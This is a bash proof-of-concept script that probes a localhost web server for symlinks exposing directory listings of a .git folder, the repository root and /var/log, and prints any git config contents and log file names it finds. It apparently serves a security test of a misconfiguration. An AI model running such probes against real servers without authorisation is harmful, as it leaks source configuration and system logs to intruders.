#!/bin/bash

# POC: Directory Listing Vulnerability via Symlinks
# Tests exposure of .git, repo root, and /var/log through symlink directory listings

TARGET_URL="http://localhost:8080"
RESULTS_FILE="/tmp/symlink_listing_results.txt"

echo "========================================" | tee "$RESULTS_FILE"
echo "Directory Listing Symlink Vulnerability POC"
echo "========================================" | tee -a "$RESULTS_FILE"
echo "Target: $TARGET_URL"
echo "========================================"  | tee -a "$RESULTS_FILE"
echo ""

# Test 1: Check git_dir symlink listing
echo "[*] Test 1: Accessing git_dir symlink..." | tee -a "$RESULTS_FILE"
GIT_DIR_RESPONSE=$(curl -s -L "$TARGET_URL/git_dir/" 2>&1)
GIT_DIR_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -L "$TARGET_URL/git_dir/" 2>&1)

if echo "$GIT_DIR_RESPONSE" | grep -qE "(config|HEAD|index|logs|objects|refs)"; then
    echo "[✓] VULNERABLE: git_dir listing exposed" | tee -a "$RESULTS_FILE"
    echo "HTTP Status: $GIT_DIR_HTTP" | tee -a "$RESULTS_FILE"
    echo "Found git directory entries:" | tee -a "$RESULTS_FILE"
    echo "$GIT_DIR_RESPONSE" | grep -oE '(config|HEAD|index|logs|objects|refs|\.git)' | sort -u | tee -a "$RESULTS_FILE"
    echo ""
else
    echo "[-] git_dir listing not accessible or empty" | tee -a "$RESULTS_FILE"
fi

# Test 2: Check git config file access
echo "[*] Test 2: Accessing git config file..." | tee -a "$RESULTS_FILE"
CONFIG_RESPONSE=$(curl -s -L "$TARGET_URL/git_dir/config" 2>&1)
CONFIG_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -L "$TARGET_URL/git_dir/config" 2>&1)

if echo "$CONFIG_RESPONSE" | grep -qE "(remote|branch|origin|url)"; then
    echo "[✓] VULNERABLE: git config file accessible" | tee -a "$RESULTS_FILE"
    echo "HTTP Status: $CONFIG_HTTP" | tee -a "$RESULTS_FILE"
    echo "Config contents (first 500 chars):" | tee -a "$RESULTS_FILE"
    echo "$CONFIG_RESPONSE" | head -c 500 | tee -a "$RESULTS_FILE"
    echo -e "\n" | tee -a "$RESULTS_FILE"
else
    echo "[-] git config not accessible" | tee -a "$RESULTS_FILE"
fi

# Test 3: Check repo_link symlink listing
echo "[*] Test 3: Accessing repo_link symlink (repo root)..." | tee -a "$RESULTS_FILE"
REPO_RESPONSE=$(curl -s -L "$TARGET_URL/repo_link/" 2>&1)
REPO_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -L "$TARGET_URL/repo_link/" 2>&1)

if echo "$REPO_RESPONSE" | grep -qE "(\.(git|dccache)|app/|docker-compose\.yml|Makefile|README|sarif)"; then
    echo "[✓] VULNERABLE: repo_link listing exposed" | tee -a "$RESULTS_FILE"
    echo "HTTP Status: $REPO_HTTP" | tee -a "$RESULTS_FILE"
    echo "Found repository files:" | tee -a "$RESULTS_FILE"
    echo "$REPO_RESPONSE" | grep -oE '([a-zA-Z0-9._-]+/(app/|\.git|.*sarif.*|.*\.yml|Makefile|README))' | sort -u | head -20 | tee -a "$RESULTS_FILE"
    echo ""
else
    echo "[-] repo_link listing not accessible" | tee -a "$RESULTS_FILE"
fi

# Test 4: Check var_log symlink listing
echo "[*] Test 4: Accessing var_log symlink (/var/log)..." | tee -a "$RESULTS_FILE"
VAR_LOG_RESPONSE=$(curl -s -L "$TARGET_URL/var_log/" 2>&1)
VAR_LOG_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -L "$TARGET_URL/var_log/" 2>&1)

if echo "$VAR_LOG_RESPONSE" | grep -qE "(alternatives\.log|dpkg\.log|faillog|apt|journal|btmp|lastlog)"; then
    echo "[✓] VULNERABLE: var_log listing exposed" | tee -a "$RESULTS_FILE"
    echo "HTTP Status: $VAR_LOG_HTTP" | tee -a "$RESULTS_FILE"
    echo "Found system log files:" | tee -a "$RESULTS_FILE"
    echo "$VAR_LOG_RESPONSE" | grep -oE '(alternatives\.log|dpkg\.log|faillog|apt|journal|btmp|lastlog|private)' | sort -u | tee -a "$RESULTS_FILE"
    echo ""
else
    echo "[-] var_log listing not accessible" | tee -a "$RESULTS_FILE"
fi

# Summary
echo "========================================" | tee -a "$RESULTS_FILE"
echo "VULNERABILITY ASSESSMENT:" | tee -a "$RESULTS_FILE"
echo "========================================" | tee -a "$RESULTS_FILE"

VULN_COUNT=0
echo "$GIT_DIR_RESPONSE" | grep -qE "(config|HEAD|index|logs|objects|refs)" && ((VULN_COUNT++))
echo "$CONFIG_RESPONSE" | grep -qE "(remote|branch|origin)" && ((VULN_COUNT++))
echo "$REPO_RESPONSE" | grep -qE "(\.(git|dccache)|app/|docker-compose\.yml)" && ((VULN_COUNT++))
echo "$VAR_LOG_RESPONSE" | grep -qE "(alternatives\.log|dpkg\.log|faillog)" && ((VULN_COUNT++))

if [ $VULN_COUNT -ge 3 ]; then
    echo "[✓] CRITICAL: Multiple directory listings exposed via symlinks" | tee -a "$RESULTS_FILE"
    echo "Confirmed exposure: $VULN_COUNT out of 4 test vectors" | tee -a "$RESULTS_FILE"
    exit 0
elif [ $VULN_COUNT -ge 1 ]; then
    echo "[!] HIGH: Some directory listings exposed via symlinks" | tee -a "$RESULTS_FILE"
    echo "Confirmed exposure: $VULN_COUNT out of 4 test vectors" | tee -a "$RESULTS_FILE"
    exit 0
else
    echo "[-] PASS: No directory listing vulnerabilities detected" | tee -a "$RESULTS_FILE"
    exit 1
fi